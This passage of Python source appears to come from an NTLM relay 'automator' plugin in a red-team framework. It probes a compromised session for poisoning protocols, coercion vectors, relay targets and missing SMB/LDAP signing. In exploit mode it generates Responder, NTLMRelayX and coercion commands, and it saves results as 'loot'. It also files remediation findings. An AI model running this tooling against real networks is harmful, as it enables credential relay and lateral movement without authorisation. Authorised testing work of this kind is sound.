                sections.append(f"    {icon} {protocol.name} — Risk: {protocol.risk_score}/100")
                sections.append(f"        Exploit: {protocol.exploit_tool}")
        else:
            sections.append("  🟢 No poisoning protocols detected")
        
        # ── Step 3: Coercion Vector Detection ───────────────────────────
        sections.append("\n[*] Phase 2: Coercion Vector Detection")
        sections.append("─"*64)
        
        coercion_vectors = DetectionEngine.detect_coercion_vectors(self._exec, session, platform)
        
        if coercion_vectors:
            sections.append(f"  🔴 {len(coercion_vectors)} coercion vector(s) available:")
            for vector in coercion_vectors[:15]:
                icon = '🔴' if vector.severity == 'critical' else '🟠' if vector.severity == 'high' else '🟡'
                sections.append(f"    {icon} {vector.name} [{vector.service}] — Risk: {vector.risk_score}/100")
                if vector.cve:
                    sections.append(f"        CVE: {vector.cve}")
                sections.append(f"        Exploit: {vector.exploit_command[:80]}")
        else:
            sections.append("  🟢 No coercion vectors detected")
        
        # ── Step 4: Relay Target Detection ──────────────────────────────
        sections.append("\n[*] Phase 3: Relay Target Detection")
        sections.append("─"*64)
        
        relay_targets = DetectionEngine.detect_relay_targets(self._exec, session, platform)
        
        if relay_targets:
            sections.append(f"  🟠 {len(relay_targets)} relay target(s) detected:")
            for target in relay_targets:
                icon = '🔴' if target.relayable else '🟢'
                sections.append(f"    {icon} {target.name} — Relayable: {'YES' if target.relayable else 'NO'}")
                sections.append(f"        Signing Required: {'YES' if target.signing_required else 'NO'}")
                sections.append(f"        Exploit: {target.exploit_command[:80]}")
        else:
            sections.append("  🟢 No relay targets detected")
        
        # ── Step 5: SMB/LDAP Signing Analysis ───────────────────────────
        sections.append("\n[*] Phase 4: SMB/LDAP Signing Analysis")
        sections.append("─"*64)
        
        smb_client, smb_server = DetectionEngine.detect_smb_signing(self._exec, session)
        ldap_signing = DetectionEngine.detect_ldap_signing(self._exec, session)
        
        sections.append(f"  SMB Client Signing: {'✅ Required' if smb_client else '❌ Not required (Relayable)'}")
        sections.append(f"  SMB Server Signing: {'✅ Required' if smb_server else '❌ Not required (Relayable)'}")
        sections.append(f"  LDAP Signing: {'✅ Required' if ldap_signing else '❌ Not required (Relayable)'}")
        
        if not smb_client or not smb_server or not ldap_signing:
            sections.append("  🔴 NTLM Relay is possible — signing not enforced")
        else:
            sections.append("  🟢 NTLM Relay mitigated — signing enforced")
        
        # ── Step 6: Relay Chain Analysis ────────────────────────────────
        if full_mode or relay_mode:
            sections.append("\n[*] Phase 5: Relay Chain Analysis")
            sections.append("─"*64)
            
            relay_chains = RelayChainsDatabase.get_all_chains()
            
            sections.append(f"  [+] {len(relay_chains)} relay chain(s) available:")
            for chain in relay_chains:
                icon = '🔴' if chain.success_probability >= 90 else '🟠' if chain.success_probability >= 80 else '🟡'
                sections.append(f"    {icon} {chain.name}")
                sections.append(f"        Final Privilege: {chain.final_privilege}")
                sections.append(f"        Complexity: {chain.complexity}")
                sections.append(f"        Success Probability: {chain.success_probability}%")
                
                if chain.steps:
                    sections.append(f"        Steps:")
                    for step in chain.steps[:3]:
                        sections.append(f"          {step['step']}. {step['action']} ({step['tool']})")
        
        # ── Step 7: Auto-Exploitation Commands ──────────────────────────
        if exploit_mode:
            sections.append("\n[*] Phase 6: Auto-Exploitation Commands")
            sections.append("─"*64)
            
            if poisoning_protocols:
                sections.append("  Responder Commands:")
                for protocol in poisoning_protocols[:3]:
                    cmd = ExploitationEngine.generate_responder_command(protocol)
                    sections.append(f"    • {cmd}")
            
            if relay_targets:
                sections.append("\n  NTLMRelayX Commands:")
                for target in relay_targets[:3]:
                    if target.relayable:
                        cmd = ExploitationEngine.generate_ntlmrelayx_command(target, '10.0.0.1')
                        sections.append(f"    • {cmd}")
            
            if coercion_vectors:
                sections.append("\n  Coercion Commands:")
                for vector in coercion_vectors[:3]:
                    cmd = ExploitationEngine.generate_coercion_command(vector, '{target}', '{attacker}')
                    sections.append(f"    • {cmd}")
        
        # ── Step 8: Generate Findings ───────────────────────────────────
        sections.append("\n[*] Phase 7: Generating Findings")
        sections.append("─"*64)
        
        findings_created = 0
        
        # Poisoning findings
        for protocol in poisoning_protocols:
            self.finding(
                title=f"Poisoning Protocol Enabled: {protocol.name}",
                description=f"{protocol.name} is enabled:\n"
                           f"  Port: {protocol.port}\n"
                           f"  Risk Score: {protocol.risk_score}/100\n"
                           f"  Exploit Tool: {protocol.exploit_tool}",
                severity='high' if protocol.risk_score >= 85 else 'medium',
                recommendation=f"Disable {protocol.name} via Group Policy. Use {protocol.exploit_tool} for testing.",
                mitre_id=protocol.mitre_id,
            )
            findings_created += 1
        
        # Coercion findings
        for vector in coercion_vectors[:5]:
            self.finding(
                title=f"Coercion Vector Available: {vector.name}",
                description=f"{vector.name} is available:\n"
                           f"  Service: {vector.service}\n"
                           f"  Protocol: {vector.protocol}\n"
                           f"  CVE: {vector.cve or 'N/A'}\n"
                           f"  Risk Score: {vector.risk_score}/100\n"
                           f"  Exploit: {vector.exploit_command[:100]}",
                severity=vector.severity,
                recommendation=f"Disable {vector.service} if not needed. Monitor for coercion attempts.",
                mitre_id=vector.mitre_id,
            )
            findings_created += 1
        
        # Relay findings
        if not smb_client or not smb_server or not ldap_signing:
            self.finding(
                title="NTLM Relay Possible — Signing Not Enforced",
                description=f"NTLM relay is possible due to missing signing:\n"
                           f"  SMB Client Signing: {'Required' if smb_client else 'Not required'}\n"
                           f"  SMB Server Signing: {'Required' if smb_server else 'Not required'}\n"
                           f"  LDAP Signing: {'Required' if ldap_signing else 'Not required'}",
                severity='high',
                recommendation="Enable SMB signing and LDAP signing via Group Policy.",
                mitre_id=self.mitre_id,
            )
            findings_created += 1
        
        # ── Step 9: Summary ─────────────────────────────────────────────
        duration = round(time.time() - start_time, 2)
        
        sections.append("\n" + "━"*64)
        sections.append("  [📊 NTLM Relay Analysis Summary]")
        sections.append("━"*64)
        sections.append(f"  Platform: {platform.upper()}")
        sections.append(f"  Poisoning Protocols: {len(poisoning_protocols)}")
        sections.append(f"  Coercion Vectors: {len(coercion_vectors)}")
        sections.append(f"  Relay Targets: {len(relay_targets)}")
        sections.append(f"  SMB Signing: {'✅ Enforced' if smb_client and smb_server else '❌ Not enforced'}")
        sections.append(f"  LDAP Signing: {'✅ Enforced' if ldap_signing else '❌ Not enforced'}")
        sections.append(f"  Findings Created: {findings_created}")
        sections.append(f"  Duration: {duration}s")
        
        if coercion_vectors:
            sections.append("\n  Top Coercion Vectors:")
            sorted_vectors = sorted(coercion_vectors, key=lambda v: v.risk_score, reverse=True)
            for vector in sorted_vectors[:5]:
                icon = '🔴' if vector.severity == 'critical' else '🟠' if vector.severity == 'high' else '🟡'
                sections.append(f"    {icon} {vector.name} ({vector.risk_score}/100)")
        
        # ── Step 10: Save to Loot ───────────────────────────────────────
        self.loot(
            {
                "type": "ntlm_relay_analysis",
                "platform": platform,
                "poisoning_protocols": [p.to_dict() for p in poisoning_protocols],
                "coercion_vectors": [v.to_dict() for v in coercion_vectors],
                "relay_targets": [t.to_dict() for t in relay_targets],
                "smb_signing": {'client': smb_client, 'server': smb_server},
                "ldap_signing": ldap_signing,
                "findings_count": findings_created,
                "duration": duration,
            },
            category='lateral',
            source='ntlm-relay-automator',
            confidence='high'
        )
        
        self.emit(
            'timeline.event',
            title=f"NTLM Relay Analysis Complete — {len(coercion_vectors)} vectors, {findings_created} findings",
            type='lateral',
            plugin=self.name
        )
        
        self.info(f"🔗 NTLM Relay Automator complete — {len(coercion_vectors)} vectors, {findings_created} findings")
        
        return '\n'.join(sections)
    
    def _detect_platform(self, session) -> str:
        for attr in ('OS', 'os', 'platform'):
            val = getattr(session, attr, None)
            if val and isinstance(val, str):
                if 'windows' in val.lower():
                    return 'windows'
                if 'linux' in val.lower():
                    return 'linux'
        try:
            out = self._exec(session, 'echo %OS%') or ''
            if 'Windows' in out:
                return 'windows'
        except Exception:
            pass
        return 'linux'
    
    @staticmethod
    def _exec(session, cmd: str) -> str:
        for method in ('exec', 'run', 'execute', 'send_command'):
            fn = getattr(session, method, None)
            if callable(fn):
                result = fn(cmd)
                if isinstance(result, bytes):
                    return result.decode(errors='replace')
                if isinstance(result, str):
                    return result
        return ''